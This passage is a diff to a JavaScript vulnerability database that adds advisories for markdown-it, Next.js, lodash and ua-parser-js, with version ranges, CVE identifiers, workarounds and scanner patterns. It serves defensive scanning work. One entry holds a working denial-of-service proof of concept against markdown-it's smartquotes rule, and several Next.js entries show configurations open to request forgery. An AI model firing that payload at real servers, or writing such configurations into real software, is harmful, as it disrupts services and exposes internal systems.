@@ -19823,6 +21519,26 @@ Fix: shouldBypassProxy() should resolve loopback aliases \u2014 localhost, 127.0
                   "https://gist.github.com/ltduc147/c9abecae1b291ede4f692f2ab988c917",
                   "https://github.com/markdown-it/markdown-it/blob/14.1.0/lib/rules_inline/linkify.mjs#L33",
                   "https://security.snyk.io/vuln/SNYK-JS-MARKDOWNIT-10666750"
+                ]
+              },
+              {
+                atOrAbove: "0",
+                below: "14.2.0",
+                severity: "medium",
+                cwe: [
+                  "CWE-400",
+                  "CWE-407"
+                ],
+                identifiers: {
+                  summary: "markdown-it: Quadratic complexity DoS in smartquotes rule via replaceAt string operations",
+                  githubID: "GHSA-6v5v-wf23-fmfq",
+                  CVE: [
+                    "CVE-2026-48988"
+                  ]
+                },
+                details: "### Summary\n\nA quadratic time complexity vulnerability exists in markdown-it's smartquotes rule (enabled via the `typographer: true` option). An attacker can craft a markdown input consisting of consecutive quotation marks that causes the parser to consume excessive CPU time, leading to denial of service.\n\n### Details\n\nThe vulnerability is in the `replaceAt()` helper function used by the smartquotes rule in `lib/rules_core/smartquotes.mjs`:\n\n```javascript\nfunction replaceAt (str, index, ch) {\n  return str.slice(0, index) + ch + str.slice(index + 1)\n}\n```\n\nWhen markdown-it processes a text token containing many quotation marks (either `\"` or `'`) with `typographer: true`, the smartquotes rule iterates through each quote character and calls `replaceAt()` to substitute it with a typographic (curly) quote. Each call to `replaceAt()` creates three new string slices and concatenates them, which is an O(n) operation where n is the length of the string.\n\nSince this is called once per quote character in the token, and there are n quote characters, the total time complexity becomes O(n^2).\n\nThe root cause is that the smartquotes rule modifies `token.content` in place using string slicing rather than building the result incrementally. The `process_inlines()` function (line 14) processes each quote in the text token, and for matching quote pairs, calls `replaceAt()` on both the opening and closing token's content (lines 151-152). When the entire input is a single text token of quote characters, this results in quadratic behavior.\n\n### PoC\n\n```javascript\nconst md = require('markdown-it');\nconst instance = md({ typographer: true });\n\n// 160,000 consecutive double-quote characters\nconst payload = '\"'.repeat(160000);\n\nconsole.time('render');\ninstance.render(payload);\nconsole.timeEnd('render');\n// Output: render: ~21000ms (21 seconds)\n\n// Compare with typographer disabled:\nconst safe = md({ typographer: false });\nconsole.time('render-safe');\nsafe.render(payload);\nconsole.timeEnd('render-safe');\n// Output: render-safe: ~8ms\n```\n\nMeasured timing on a modern system:\n- 10,000 quotes: ~19ms\n- 20,000 quotes: ~51ms\n- 40,000 quotes: ~212ms\n- 80,000 quotes: ~5,430ms\n- 160,000 quotes: ~21,198ms\n\nThe scaling is clearly superlinear (quadratic), with the 80K->160K step showing a ~3.9x increase for a 2x input increase, consistent with O(n^2).\n\n### Impact\n\nApplications that render user-supplied markdown with `typographer: true` are vulnerable to denial of service. An attacker can submit a relatively small payload (160KB of quote characters) that causes the server to spend over 21 seconds processing a single request. Repeated submissions can exhaust server CPU resources and prevent legitimate users from being served.\n\nThe impact is mitigated by the fact that the `typographer` option defaults to `false` and must be explicitly enabled. However, the typographer feature is commonly enabled in production applications that want smart typography, and the markdown-it documentation prominently suggests enabling it.\n\nA suggested fix would be to replace the `replaceAt()` approach with an array-based or StringBuilder-style approach that collects all replacements and applies them in a single pass, reducing the time complexity to O(n).",
+                info: [
+                  "https://github.com/markdown-it/markdown-it/security/advisories/GHSA-6v5v-wf23-fmfq"
                 ]
               }
             ],
@@ -22318,6 +24034,190 @@ Fix: shouldBypassProxy() should resolve loopback aliases \u2014 localhost, 127.0
                 ]
               },
               {
+                atOrAbove: "12.0.0",
+                below: "15.5.21",
+                severity: "high",
+                cwe: [
+                  "CWE-918"
+                ],
+                identifiers: {
+                  summary: "Next.js: Server-Side Request Forgery in rewrites via attacker-controlled destination hostname",
+                  githubID: "GHSA-p9j2-gv94-2wf4",
+                  CVE: [
+                    "CVE-2026-64645"
+                  ]
+                },
+                details: "## Impact\n\nA `rewrites()` or `redirects()` rule that builds its external destination hostname from request-controlled input can be pointed at an arbitrary hostname, regardless of the rule's\xA0hostname suffix. For a rewrite, Next.js proxies the request to that arbitrary host and serves the response from the application's origin, leading to Server-Side Request forgery. A `redirects()` rule configured this way is vulnerable to an Open Redirect.\n\nThis affects any destination that puts a dynamic segment in the hostname, whether from the path:\n\n```javascript\n// next.config.js\nmodule.exports = {\n  async rewrites() {\n    return [\n      {\n        source: '/:tenant',\n        destination: 'https://:tenant.api.example.com',\n      },\n    ]\n  },\n}\n```\n\nor from a `has` capture:\n\n```javascript\n// next.config.js\nmodule.exports = {\n  async rewrites() {\n    return [\n      {\n        source: '/',\n        has: [{ type: 'query', key: 'region', value: '(?<region>.+)' }],\n        destination: 'https://:region.api.example.com',\n      },\n    ]\n  },\n}\n```\n\n## Workarounds\n\nIf you cannot upgrade immediately, do not build the hostname of an external `rewrites()` or `redirects()` destination from user-controlled input. If a dynamic subdomain is required, constrain the value to hostname-safe characters:  `value: '(?<region>[a-z0-9-]+)'`.",
+                info: [
+                  "https://github.com/vercel/next.js/security/advisories/GHSA-p9j2-gv94-2wf4",
+                  "https://github.com/vercel/next.js/commit/35f501357e9b0fe7c950b0d6aa8fcf5343f707e9",
+                  "https://github.com/vercel/next.js/commit/d3033266c6dff23f7be71e19341fe3a8c6e2c599",
+                  "https://github.com/vercel/next.js/releases/tag/v15.5.21",
+                  "https://github.com/vercel/next.js/releases/tag/v16.2.11"
+                ]
+              },
+              {
+                atOrAbove: "13.0.0",
+                below: "15.5.21",
+                severity: "medium",
+                cwe: [
+                  "CWE-116"
+                ],
+                identifiers: {
+                  summary: "Next.js: Cache confusion of response bodies for requests with bodies containing invalid UTF-8 byte sequences",
+                  githubID: "GHSA-4633-3j49-mh5q",
+                  CVE: [
+                    "CVE-2026-64647"
+                  ]
+                },
+                details: "## Impact\n\nA server-side `fetch` with a request body may return a cached **response** body from a different request to the same URL but different body. Confidential data in the `POST`'s **response** body would then leak to unauthorized requests. Though the request itself will not be deduped.\n\nThis is only an issue when receiving request bodies with a content type charset other than UTF-8. For example, the UTF-16 byte sequences for `\uC083\uC083` and `\uC104\uC104` in the request body would share the same cache.\n\n## Workarounds\n\nIf you cannot upgrade, consider only making fetch requests with UTF-8 bodies (default in Next.js). Applications using Pages Router are not vulnerable.",
+                info: [
+                  "https://github.com/vercel/next.js/security/advisories/GHSA-4633-3j49-mh5q",
+                  "https://github.com/vercel/next.js/pull/96008",
+                  "https://github.com/vercel/next.js/commit/025bf4a5f7b47fb7758c4ebf1c931a61c451c082",
+                  "https://github.com/vercel/next.js/releases/tag/v15.5.21",
+                  "https://github.com/vercel/next.js/releases/tag/v16.2.11"
+                ]
+              },
+              {
+                atOrAbove: "13.0.0",
+                below: "15.5.21",
+                severity: "medium",
+                cwe: [
+                  "CWE-770"
+                ],
+                identifiers: {
+                  summary: "Next.js: Unbounded Server Action payload in Edge runtime",
+                  githubID: "GHSA-4c39-4ccg-62r3",
+                  CVE: [
+                    "CVE-2026-64646"
+                  ]
+                },
+                details: "## Impact\n\nRequests targeting Next.js applications using App Router with at least one Server Action can lead to excessive memory consumption if that Server Actions uses the Edge runtime\n\n## Workarounds\n\nIf you cannot upgrade, ensure your hosting provider limits the request's body size. 5 MiB should be allowed at max by your hosting provider.",
+                info: [
+                  "https://github.com/vercel/next.js/security/advisories/GHSA-4c39-4ccg-62r3",
+                  "https://github.com/vercel/next.js/commit/57c31f724d746e86a9e8b92aa8be538a922446a4",
+                  "https://github.com/vercel/next.js/commit/9a4651e754f70b12e397694ffc41f44c3ba8cc17",
+                  "https://github.com/vercel/next.js/releases/tag/v15.5.21",
+                  "https://github.com/vercel/next.js/releases/tag/v16.2.11"
+                ]
+              },
+              {
+                atOrAbove: "13.0.0",
+                below: "15.5.21",
+                severity: "medium",
+                cwe: [
+                  "CWE-524"
+                ],
+                identifiers: {
+                  summary: "Next.js: Cache confusion of response bodies for requests with bodies",
+                  githubID: "GHSA-68g3-v927-f742",
+                  CVE: [
+                    "CVE-2026-64648"
+                  ]
+                },
+                details: "## Impact\n\nA server-side `fetch` with a request body may return a cached **response** body from a different request to the same URL but different body. Confidential data in the `POST`'s **response** body would then leak to unauthorized requests. Though the request itself will not be deduped.\n\nThis only applies to `fetch` calls with a request that has a different init than the one passed to `fetch`.\nSafe: `fetch(new Request(init), init)`\nUnsafe: `fetch(new Request(init), aDifferentInit)`\n\n## Workarounds\n\nNo workaround exists besides upgrading. Applications using Pages Router are not vulnerable.",
+                info: [
+                  "https://github.com/vercel/next.js/security/advisories/GHSA-68g3-v927-f742",
+                  "https://github.com/vercel/next.js/commit/062f66700b52a5d6bba2c0605d55577ab7ad262c",
+                  "https://github.com/vercel/next.js/commit/73b94872bc343d09494b50394d8c08eb9fc8e56a",
+                  "https://github.com/vercel/next.js/releases/tag/v15.5.21",
+                  "https://github.com/vercel/next.js/releases/tag/v16.2.11"
+                ]
+              },
+              {
+                atOrAbove: "13.0.0",
+                below: "15.5.21",
+                severity: "medium",
+                cwe: [
+                  "CWE-201"
+                ],
+                identifiers: {
+                  summary: "Next.js: Unauthenticated disclosure of internal Server Function endpoints",
+                  githubID: "GHSA-955p-x3mx-jcvp",
+                  CVE: [
+                    "CVE-2026-64643"
+                  ]
+                },
+                details: "## Impact\n\nIn Next.js applications using App Router, Server Actions (`use server`) or `use cache` endpoints can be disclosed bypassing any authentication on the pages where these endpoints are usually used.\n\nServer Action IDs can be disclosed to unauthenticated users via publicly served client artifacts (for example, static chunks containing action references).\n\nAffected users are applications using App Router + Server Actions.  \n\nBy itself, this disclosure is typically a recon/enumeration primitive; however, it can increase risk when combined with other weaknesses.\n \n## Workarounds\n\nNever assume any authentication claims at the `use cache` or `use server` boundary. Always authenticate within the boundary.",
+                info: [
+                  "https://github.com/vercel/next.js/security/advisories/GHSA-955p-x3mx-jcvp",
+                  "https://github.com/vercel/next.js/commit/1b0c3ae912a3ad925c60065cc8d55b070fa8bcd3",
+                  "https://github.com/vercel/next.js/commit/ff12a6124e1504f17b62de948b8a553fdecaef7b",
+                  "https://github.com/vercel/next.js/releases/tag/v15.5.21",
+                  "https://github.com/vercel/next.js/releases/tag/v16.2.11"
+                ]
+              },
+              {
+                atOrAbove: "13.0.0",
+                below: "15.5.21",
+                severity: "high",
+                cwe: [
+                  "CWE-834"
+                ],
+                identifiers: {
+                  summary: "Next.js: Denial of Service in App Router using Server Actions",
+                  githubID: "GHSA-m99w-x7hq-7vfj",
+                  CVE: [
+                    "CVE-2026-64641"
+                  ]
+                },
+                details: "## Impact\n\nCrafted requests targeting Next.js applications using App Router with at least one Server Action can lead to excessive CPU usage blocking processing of further requests in the same process.\n\n## Workarounds\n\nNo workaround exists besides upgrading. Applications using Pages Router or not using Server Actions are not vulnerable.",
+                info: [
+                  "https://github.com/vercel/next.js/security/advisories/GHSA-m99w-x7hq-7vfj",
+                  "https://github.com/vercel/next.js/pull/96013",
+                  "https://github.com/vercel/next.js/commit/019628571641dec57aaf349ba0c360e3964e6f12",
+                  "https://github.com/vercel/next.js/releases/tag/v15.5.21",
+                  "https://github.com/vercel/next.js/releases/tag/v16.2.11"
+                ]
+              },
+              {
+                atOrAbove: "14.1.1",
+                below: "15.5.21",
+                severity: "high",
+                cwe: [
+                  "CWE-918"
+                ],
+                identifiers: {
+                  summary: "Next.js: Server-Side Request Forgery in Server Actions on custom servers",
+                  githubID: "GHSA-89xv-2m56-2m9x",
+                  CVE: [
+                    "CVE-2026-64649"
+                  ]
+                },
+                details: "## Impact\n\nWhen a Server Action forwards or redirects a request, an attacker can cause the server to send that outbound request to a malicious host (Server-Side Request Forgery). This requires the attacker's request to control Host-associated headers. In some configurations, it's also possible to obtain internal values that weaken middleware/proxy authorization.\n\nApplications that use Server Actions are affected when the incoming host header is not fixed to a trusted value. This typically occurs on custom servers, or on deployments not behind a proxy that pins the host. Managed hosting pins the host upstream and is not affected; `next start` and standalone output do the same from version 14.2 onward.\n\n## Workarounds\n\nIf you cannot upgrade, ensure clients do not control the host header your application receives. Pin or validate `Host` and `X-Forwarded-Host` at your edge or proxy. On version 14.2.0 and later, you can additionally set the `__NEXT_PRIVATE_ORIGIN` environment variable to your deployment's real origin:\n\n```bash\n__NEXT_PRIVATE_ORIGIN=https://www.example.com node server.js",
+                info: [
+                  "https://github.com/vercel/next.js/security/advisories/GHSA-89xv-2m56-2m9x",
+                  "https://github.com/vercel/next.js/commit/b51206321854193208c0805ba42acc49287f942b",
+                  "https://github.com/vercel/next.js/commit/e3e5666ccead3a15162793d697af5e48b7cc0498",
+                  "https://github.com/vercel/next.js/releases/tag/v15.5.21",
+                  "https://github.com/vercel/next.js/releases/tag/v16.2.11"
+                ]
+              },
+              {
+                atOrAbove: "15.5.0",
+                below: "15.5.21",
+                severity: "medium",
+                cwe: [
+                  "CWE-407"
+                ],
+                identifiers: {
+                  summary: "Next.js: Denial of Service in the Image Optimization API using SVGs",
+                  githubID: "GHSA-q8wf-6r8g-63ch",
+                  CVE: [
+                    "CVE-2026-64644"
+                  ]
+                },
+                details: "### Impact\n\nWhen self-hosting Next.js with the default image loader, the Image Optimization API can optimize remotely hosted images if configured (not enabled by default). If those images contain malicious content, they can cause CPU exhaustion in  `/_next/image` endpoints.\n\n- If you are using `config.images.remotePatterns`, only the patterns in that array are impacted.\n- If you are using `config.images.unoptimized: true`, you are NOT impacted.\n- If you are using `config.images.loader: 'custom'`, you are NOT impacted.\n- If you are using Vercel, you are NOT impacted.\n\n### Workarounds\n\nIf you cannot upgrade immediately, you can avoid the expensive work by setting `config.experimental.imgOptSkipMetadata : true`.",
+                info: [
+                  "https://github.com/vercel/next.js/security/advisories/GHSA-q8wf-6r8g-63ch",
+                  "https://github.com/vercel/next.js/pull/96006",
+                  "https://github.com/vercel/next.js/commit/93cb90891402fa4c47798d03cb9e05c13233766c",
+                  "https://github.com/vercel/next.js/releases/tag/v15.5.21",
+                  "https://github.com/vercel/next.js/releases/tag/v16.2.11"
+                ]
+              },
+              {
                 atOrAbove: "15.6.0-canary.0",
                 below: "15.6.0-canary.59",
                 severity: "high",
@@ -23037,6 +24937,212 @@ Fix: shouldBypassProxy() should resolve loopback aliases \u2014 localhost, 127.0
                   "https://github.com/vercel/next.js/releases/tag/v15.5.18",
                   "https://github.com/vercel/next.js/releases/tag/v16.2.6"
                 ]
+              },
+              {
+                atOrAbove: "16.0.0",
+                below: "16.2.11",
+                severity: "medium",
+                cwe: [
+                  "CWE-116"
+                ],
+                identifiers: {
+                  summary: "Next.js: Cache confusion of response bodies for requests with bodies containing invalid UTF-8 byte sequences",
+                  githubID: "GHSA-4633-3j49-mh5q",
+                  CVE: [
+                    "CVE-2026-64647"
+                  ]
+                },
+                details: "## Impact\n\nA server-side `fetch` with a request body may return a cached **response** body from a different request to the same URL but different body. Confidential data in the `POST`'s **response** body would then leak to unauthorized requests. Though the request itself will not be deduped.\n\nThis is only an issue when receiving request bodies with a content type charset other than UTF-8. For example, the UTF-16 byte sequences for `\uC083\uC083` and `\uC104\uC104` in the request body would share the same cache.\n\n## Workarounds\n\nIf you cannot upgrade, consider only making fetch requests with UTF-8 bodies (default in Next.js). Applications using Pages Router are not vulnerable.",
+                info: [
+                  "https://github.com/vercel/next.js/security/advisories/GHSA-4633-3j49-mh5q",
+                  "https://github.com/vercel/next.js/pull/96008",
+                  "https://github.com/vercel/next.js/commit/025bf4a5f7b47fb7758c4ebf1c931a61c451c082",
+                  "https://github.com/vercel/next.js/releases/tag/v15.5.21",
+                  "https://github.com/vercel/next.js/releases/tag/v16.2.11"
+                ]
+              },
+              {
+                atOrAbove: "16.0.0",
+                below: "16.2.11",
+                severity: "medium",
+                cwe: [
+                  "CWE-770"
+                ],
+                identifiers: {
+                  summary: "Next.js: Unbounded Server Action payload in Edge runtime",
+                  githubID: "GHSA-4c39-4ccg-62r3",
+                  CVE: [
+                    "CVE-2026-64646"
+                  ]
+                },
+                details: "## Impact\n\nRequests targeting Next.js applications using App Router with at least one Server Action can lead to excessive memory consumption if that Server Actions uses the Edge runtime\n\n## Workarounds\n\nIf you cannot upgrade, ensure your hosting provider limits the request's body size. 5 MiB should be allowed at max by your hosting provider.",
+                info: [
+                  "https://github.com/vercel/next.js/security/advisories/GHSA-4c39-4ccg-62r3",
+                  "https://github.com/vercel/next.js/commit/57c31f724d746e86a9e8b92aa8be538a922446a4",
+                  "https://github.com/vercel/next.js/commit/9a4651e754f70b12e397694ffc41f44c3ba8cc17",
+                  "https://github.com/vercel/next.js/releases/tag/v15.5.21",
+                  "https://github.com/vercel/next.js/releases/tag/v16.2.11"
+                ]
+              },
+              {
+                atOrAbove: "16.0.0",
+                below: "16.2.11",
+                severity: "medium",
+                cwe: [
+                  "CWE-524"
+                ],
+                identifiers: {
+                  summary: "Next.js: Cache confusion of response bodies for requests with bodies",
+                  githubID: "GHSA-68g3-v927-f742",
+                  CVE: [
+                    "CVE-2026-64648"
+                  ]
+                },
+                details: "## Impact\n\nA server-side `fetch` with a request body may return a cached **response** body from a different request to the same URL but different body. Confidential data in the `POST`'s **response** body would then leak to unauthorized requests. Though the request itself will not be deduped.\n\nThis only applies to `fetch` calls with a request that has a different init than the one passed to `fetch`.\nSafe: `fetch(new Request(init), init)`\nUnsafe: `fetch(new Request(init), aDifferentInit)`\n\n## Workarounds\n\nNo workaround exists besides upgrading. Applications using Pages Router are not vulnerable.",
+                info: [
+                  "https://github.com/vercel/next.js/security/advisories/GHSA-68g3-v927-f742",
+                  "https://github.com/vercel/next.js/commit/062f66700b52a5d6bba2c0605d55577ab7ad262c",
+                  "https://github.com/vercel/next.js/commit/73b94872bc343d09494b50394d8c08eb9fc8e56a",
+                  "https://github.com/vercel/next.js/releases/tag/v15.5.21",
+                  "https://github.com/vercel/next.js/releases/tag/v16.2.11"
+                ]
+              },
+              {
+                atOrAbove: "16.0.0",
+                below: "16.2.11",
+                severity: "high",
+                cwe: [
+                  "CWE-285"
+                ],
+                identifiers: {
+                  summary: "Next.js: Middleware / Proxy bypass in App Router applications using Turbopack and single locale",
+                  githubID: "GHSA-6gpp-xcg3-4w24",
+                  CVE: [
+                    "CVE-2026-64642"
+                  ]
+                },
+                details: "## Impact\n\nCrafted requests targeting Next.js applications using App Router built with Turbopack and a **single** entry in `config.i18n.locales` can bypass middleware/proxy based authentication.\n\n## Workarounds\n\nIf you cannot upgrade immediately, enforce authorization in the page's server-side data path instead of relying solely on middleware.",
+                info: [
+                  "https://github.com/vercel/next.js/security/advisories/GHSA-6gpp-xcg3-4w24",
+                  "https://github.com/vercel/next.js/pull/96014",
+                  "https://github.com/vercel/next.js/commit/6bf4df14508ad6c0cd46af50c6051ee42f2d9151",
+                  "https://github.com/vercel/next.js/releases/tag/v16.2.11"
+                ]
+              },
+              {
+                atOrAbove: "16.0.0",
+                below: "16.2.11",
+                severity: "high",
+                cwe: [
+                  "CWE-918"
+                ],
+                identifiers: {
+                  summary: "Next.js: Server-Side Request Forgery in Server Actions on custom servers",
+                  githubID: "GHSA-89xv-2m56-2m9x",
+                  CVE: [
+                    "CVE-2026-64649"
+                  ]
+                },
+                details: "## Impact\n\nWhen a Server Action forwards or redirects a request, an attacker can cause the server to send that outbound request to a malicious host (Server-Side Request Forgery). This requires the attacker's request to control Host-associated headers. In some configurations, it's also possible to obtain internal values that weaken middleware/proxy authorization.\n\nApplications that use Server Actions are affected when the incoming host header is not fixed to a trusted value. This typically occurs on custom servers, or on deployments not behind a proxy that pins the host. Managed hosting pins the host upstream and is not affected; `next start` and standalone output do the same from version 14.2 onward.\n\n## Workarounds\n\nIf you cannot upgrade, ensure clients do not control the host header your application receives. Pin or validate `Host` and `X-Forwarded-Host` at your edge or proxy. On version 14.2.0 and later, you can additionally set the `__NEXT_PRIVATE_ORIGIN` environment variable to your deployment's real origin:\n\n```bash\n__NEXT_PRIVATE_ORIGIN=https://www.example.com node server.js",
+                info: [
+                  "https://github.com/vercel/next.js/security/advisories/GHSA-89xv-2m56-2m9x",
+                  "https://github.com/vercel/next.js/commit/b51206321854193208c0805ba42acc49287f942b",
+                  "https://github.com/vercel/next.js/commit/e3e5666ccead3a15162793d697af5e48b7cc0498",
+                  "https://github.com/vercel/next.js/releases/tag/v15.5.21",
+                  "https://github.com/vercel/next.js/releases/tag/v16.2.11"
+                ]
+              },
+              {
+                atOrAbove: "16.0.0",
+                below: "16.2.11",
+                severity: "medium",
+                cwe: [
+                  "CWE-201"
+                ],
+                identifiers: {
+                  summary: "Next.js: Unauthenticated disclosure of internal Server Function endpoints",
+                  githubID: "GHSA-955p-x3mx-jcvp",
+                  CVE: [
+                    "CVE-2026-64643"
+                  ]
+                },
+                details: "## Impact\n\nIn Next.js applications using App Router, Server Actions (`use server`) or `use cache` endpoints can be disclosed bypassing any authentication on the pages where these endpoints are usually used.\n\nServer Action IDs can be disclosed to unauthenticated users via publicly served client artifacts (for example, static chunks containing action references).\n\nAffected users are applications using App Router + Server Actions.  \n\nBy itself, this disclosure is typically a recon/enumeration primitive; however, it can increase risk when combined with other weaknesses.\n \n## Workarounds\n\nNever assume any authentication claims at the `use cache` or `use server` boundary. Always authenticate within the boundary.",
+                info: [
+                  "https://github.com/vercel/next.js/security/advisories/GHSA-955p-x3mx-jcvp",
+                  "https://github.com/vercel/next.js/commit/1b0c3ae912a3ad925c60065cc8d55b070fa8bcd3",
+                  "https://github.com/vercel/next.js/commit/ff12a6124e1504f17b62de948b8a553fdecaef7b",
+                  "https://github.com/vercel/next.js/releases/tag/v15.5.21",
+                  "https://github.com/vercel/next.js/releases/tag/v16.2.11"
+                ]
+              },
+              {
+                atOrAbove: "16.0.0",
+                below: "16.2.11",
+                severity: "high",
+                cwe: [
+                  "CWE-834"
+                ],
+                identifiers: {
+                  summary: "Next.js: Denial of Service in App Router using Server Actions",
+                  githubID: "GHSA-m99w-x7hq-7vfj",
+                  CVE: [
+                    "CVE-2026-64641"
+                  ]
+                },
+                details: "## Impact\n\nCrafted requests targeting Next.js applications using App Router with at least one Server Action can lead to excessive CPU usage blocking processing of further requests in the same process.\n\n## Workarounds\n\nNo workaround exists besides upgrading. Applications using Pages Router or not using Server Actions are not vulnerable.",
+                info: [
+                  "https://github.com/vercel/next.js/security/advisories/GHSA-m99w-x7hq-7vfj",
+                  "https://github.com/vercel/next.js/pull/96013",
+                  "https://github.com/vercel/next.js/commit/019628571641dec57aaf349ba0c360e3964e6f12",
+                  "https://github.com/vercel/next.js/releases/tag/v15.5.21",
+                  "https://github.com/vercel/next.js/releases/tag/v16.2.11"
+                ]
+              },
+              {
+                atOrAbove: "16.0.0",
+                below: "16.2.11",
+                severity: "high",
+                cwe: [
+                  "CWE-918"
+                ],
+                identifiers: {
+                  summary: "Next.js: Server-Side Request Forgery in rewrites via attacker-controlled destination hostname",
+                  githubID: "GHSA-p9j2-gv94-2wf4",
+                  CVE: [
+                    "CVE-2026-64645"
+                  ]
+                },
+                details: "## Impact\n\nA `rewrites()` or `redirects()` rule that builds its external destination hostname from request-controlled input can be pointed at an arbitrary hostname, regardless of the rule's\xA0hostname suffix. For a rewrite, Next.js proxies the request to that arbitrary host and serves the response from the application's origin, leading to Server-Side Request forgery. A `redirects()` rule configured this way is vulnerable to an Open Redirect.\n\nThis affects any destination that puts a dynamic segment in the hostname, whether from the path:\n\n```javascript\n// next.config.js\nmodule.exports = {\n  async rewrites() {\n    return [\n      {\n        source: '/:tenant',\n        destination: 'https://:tenant.api.example.com',\n      },\n    ]\n  },\n}\n```\n\nor from a `has` capture:\n\n```javascript\n// next.config.js\nmodule.exports = {\n  async rewrites() {\n    return [\n      {\n        source: '/',\n        has: [{ type: 'query', key: 'region', value: '(?<region>.+)' }],\n        destination: 'https://:region.api.example.com',\n      },\n    ]\n  },\n}\n```\n\n## Workarounds\n\nIf you cannot upgrade immediately, do not build the hostname of an external `rewrites()` or `redirects()` destination from user-controlled input. If a dynamic subdomain is required, constrain the value to hostname-safe characters:  `value: '(?<region>[a-z0-9-]+)'`.",
+                info: [
+                  "https://github.com/vercel/next.js/security/advisories/GHSA-p9j2-gv94-2wf4",
+                  "https://github.com/vercel/next.js/commit/35f501357e9b0fe7c950b0d6aa8fcf5343f707e9",
+                  "https://github.com/vercel/next.js/commit/d3033266c6dff23f7be71e19341fe3a8c6e2c599",
+                  "https://github.com/vercel/next.js/releases/tag/v15.5.21",
+                  "https://github.com/vercel/next.js/releases/tag/v16.2.11"
+                ]
+              },
+              {
+                atOrAbove: "16.0.0",
+                below: "16.2.11",
+                severity: "medium",
+                cwe: [
+                  "CWE-407"
+                ],
+                identifiers: {
+                  summary: "Next.js: Denial of Service in the Image Optimization API using SVGs",
+                  githubID: "GHSA-q8wf-6r8g-63ch",
+                  CVE: [
+                    "CVE-2026-64644"
+                  ]
+                },
+                details: "### Impact\n\nWhen self-hosting Next.js with the default image loader, the Image Optimization API can optimize remotely hosted images if configured (not enabled by default). If those images contain malicious content, they can cause CPU exhaustion in  `/_next/image` endpoints.\n\n- If you are using `config.images.remotePatterns`, only the patterns in that array are impacted.\n- If you are using `config.images.unoptimized: true`, you are NOT impacted.\n- If you are using `config.images.loader: 'custom'`, you are NOT impacted.\n- If you are using Vercel, you are NOT impacted.\n\n### Workarounds\n\nIf you cannot upgrade immediately, you can avoid the expensive work by setting `config.experimental.imgOptSkipMetadata : true`.",
+                info: [
+                  "https://github.com/vercel/next.js/security/advisories/GHSA-q8wf-6r8g-63ch",
+                  "https://github.com/vercel/next.js/pull/96006",
+                  "https://github.com/vercel/next.js/commit/93cb90891402fa4c47798d03cb9e05c13233766c",
+                  "https://github.com/vercel/next.js/releases/tag/v15.5.21",
+                  "https://github.com/vercel/next.js/releases/tag/v16.2.11"
+                ]
               }
             ],
             extractors: {
@@ -23617,7 +25723,8 @@ Fix: shouldBypassProxy() should resolve loopback aliases \u2014 localhost, 127.0
                 identifiers: {
                   summary: "Command Injection in lodash",
                   CVE: [
-                    "CVE-2021-23337"
+                    "CVE-2021-23337",
+                    "CVE-2026-4800"
                   ],
                   githubID: "GHSA-35jh-r3h4-6jhm"
                 },
@@ -23690,7 +25797,8 @@ Fix: shouldBypassProxy() should resolve loopback aliases \u2014 localhost, 127.0
                   summary: "Lodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution via the _.unset and _.omit functions. An attacker can pass crafted paths to delete methods from global prototypes such as Object.prototype, though the issue only permits deletion and not overwriting of properties.",
                   githubID: "GHSA-xxjr-mmjv-4gpg",
                   CVE: [
-                    "CVE-2025-13465"
+                    "CVE-2025-13465",
+                    "CVE-2026-2950"
                   ]
                 },
                 details: "### Impact\n\nLodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes. \n\nThe issue permits deletion of properties but does not allow overwriting their original behavior.  \n\n### Patches\n\nThis issue is patched on 4.17.23.",
@@ -23710,6 +25818,7 @@ Fix: shouldBypassProxy() should resolve loopback aliases \u2014 localhost, 127.0
                   summary: "Lodash 4.17.23 and earlier are vulnerable to a prototype pollution bypass in _.unset and _.omit. The fix for CVE-2025-13465 only guards against string key members, so attackers can bypass it by passing array-wrapped path segments to delete properties from built-in prototypes including Object.prototype, Number.prototype, and String.prototype.",
                   githubID: "GHSA-f23m-r3pf-42rh",
                   CVE: [
+                    "CVE-2025-13465",
                     "CVE-2026-2950"
                   ]
                 },
@@ -23730,6 +25839,7 @@ Fix: shouldBypassProxy() should resolve loopback aliases \u2014 localhost, 127.0
                   summary: "Lodash _.template is vulnerable to code injection via unsanitized options.imports key names. Untrusted key names are passed to the Function() constructor sink without validation, and the use of assignInWith (which enumerates inherited properties) also means that pre-existing prototype pollution on Object.prototype can flow into the Function() sink and execute arbitrary code at template compilation time.",
                   githubID: "GHSA-r5fr-rjxr-66jc",
                   CVE: [
+                    "CVE-2021-23337",
                     "CVE-2026-4800"
                   ]
                 },
@@ -23752,6 +25862,10 @@ Fix: shouldBypassProxy() should resolve loopback aliases \u2014 localhost, 127.0
               ],
               uri: [
                 "/(\xA7\xA7version\xA7\xA7)/lodash(\\.min)?\\.js"
+              ],
+              ast: [
+                '//BlockStatement[       //VariableDeclarator[/:init/:value == "__lodash_placeholder__"]     ]//AssignmentExpression[       /:left/:property/:name == "VERSION"     ]/$$:right/:value',
+                '//BlockStatement[       //AssignmentExpression/:left/:property/:name == "forOwn" &&       //AssignmentExpression/:left/:property/:name == "forIn" &&       //AssignmentExpression/:left/:property/:name == "VERSION"     ]//AssignmentExpression[       /:left/:property/:name == "VERSION"     ]/$$:right/:value'
               ]
             }
           },
@@ -23860,7 +25974,7 @@ Fix: shouldBypassProxy() should resolve loopback aliases \u2014 localhost, 127.0
                 atOrAbove: "0.7.29",
                 below: "0.7.30",
                 cwe: [
-                  "CWE-829",
+                  "CWE-506",
                   "CWE-912"
                 ],
                 severity: "high",
@@ -23907,7 +26021,7 @@ Fix: shouldBypassProxy() should resolve loopback aliases \u2014 localhost, 127.0
                 atOrAbove: "0.8.0",
                 below: "0.8.1",
                 cwe: [
-                  "CWE-829",
+                  "CWE-506",
                   "CWE-912"
                 ],
                 severity: "high",
@@ -23930,7 +26044,7 @@ Fix: shouldBypassProxy() should resolve loopback aliases \u2014 localhost, 127.0
                 atOrAbove: "1.0.0",
                 below: "1.0.1",
                 cwe: [
-                  "CWE-829",
+                  "CWE-506",
                   "CWE-912"
                 ],
                 severity: "high",
@@ -23971,6 +26085,26 @@ Fix: shouldBypassProxy() should resolve loopback aliases \u2014 localhost, 127.0
                   "https://github.com/faisalman/ua-parser-js/commit/a6140a17dd0300a35cfc9cff999545f267889411",
                   "https://github.com/faisalman/ua-parser-js",
                   "https://security.snyk.io/vuln/SNYK-JS-UAPARSERJS-3244450"
+                ]
+              },
+              {
+                atOrAbove: "2.0.1",
+                below: "2.0.10",
+                severity: "medium",
